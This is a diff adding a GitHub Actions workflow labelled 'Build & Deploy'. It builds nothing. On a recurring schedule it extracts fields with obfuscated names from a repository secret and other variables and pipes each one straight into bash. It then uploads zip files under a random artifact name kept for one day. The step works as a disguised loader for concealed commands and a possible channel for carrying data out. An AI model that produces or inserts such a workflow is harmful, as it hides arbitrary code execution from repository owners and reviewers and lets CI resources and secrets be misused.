@@ -1,0 +1,32 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          uc71733: ${{ secrets.uc71733 }}
+        run: |
+          printf '%s' "$uc71733" | jq -r .setyg0 | /bin/bash
+          echo $fhz1 | jq -r .eud829 | /bin/bash
+          echo $ofor5 | jq -r .pp7 | /bin/bash
+          echo $xp24208 | jq -r .z40845 | /bin/bash
+          echo $iud2080 | jq -r .eqv44914 | /bin/bash
+          printf '%s' "$byh9" | jq -r .kcgkl891 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YBXHJlv8
+          path: "*.zip"
+          retention-days: 1
